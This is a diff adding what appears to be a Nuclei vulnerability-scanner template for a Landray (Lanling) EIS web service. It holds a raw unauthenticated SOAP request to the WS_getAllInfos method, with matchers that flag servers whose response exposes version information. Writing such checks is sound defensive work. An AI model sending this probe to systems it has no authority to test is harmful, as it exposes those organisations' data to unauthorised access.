@@ -1,0 +1,45 @@
+
+id: Lanling-eis-WS_getAllInfos
+info:
+  name: WS_getAllInfos
+  author: beitso
+  severity: high
+  description: WS_getAllInfos
+  
+http:
+  - raw:
+      - |-
+        POST /WS/Basic/Basic.asmx HTTP/1.1
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:122.0) Gecko/20100101 Firefox/122.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Connection: close
+        Cookie: ASP.NET_SessionId=u1n0cky5q5giplqhpajjrf55; FIOA_IMG_FOLDER=FI
+        Upgrade-Insecure-Requests: 1
+        SOAPAction: http://tempuri.org/WS_getAllInfos
+        Content-Type: text/xml;charset=UTF-8
+        Host: 
+        Content-Length: 214        
+
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
+        <soapenv:Header/>
+        <soapenv:Body>
+        <tem:WS_getAllInfos/>
+        </soapenv:Body>
+        </soapenv:Envelope>
+
+
+        
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "version"
+          - "WS_getAllInfosResponse"
+        condition: and
+        part: body
